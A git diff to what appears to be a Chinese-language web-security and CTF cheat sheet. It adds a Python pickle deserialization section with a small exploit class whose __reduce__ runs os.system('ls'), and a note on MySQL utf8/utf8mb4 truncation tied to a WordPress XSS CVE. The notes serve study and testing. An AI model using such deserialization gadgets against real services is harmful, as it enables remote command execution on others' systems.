@@ -1061,6 +1061,17 @@ HQL injection example (pwn2win 2017)
     - `O:4:"test":1:{s:1:"a";s:3:"aaa";}`
     - 兩者結果相同
 
+## Python Pickle
+
+- `dumps()` 將物件序列化成字串
+- `loads()` 將字串反序列化
+
+```python
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('ls',))
+```
+
 
 # SSTI 
 
@@ -1412,6 +1423,11 @@ xxe.dtd:
     - `ＮＮ` => `..`
         - `Ｎ` 即 `\xff\x2e`
         - 轉型時捨棄第一個Byte
+
+- MySQL utf8 v.s. utf8mb4
+    - MySQL utf8編碼只支援3 bytes
+    - 若將4 bytes的utf8mb4插入utf8中，在non strict模式下會被截斷
+    - CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability
 
 - tcpdump
     - `-i` 指定網卡，不指定則監控所有網卡
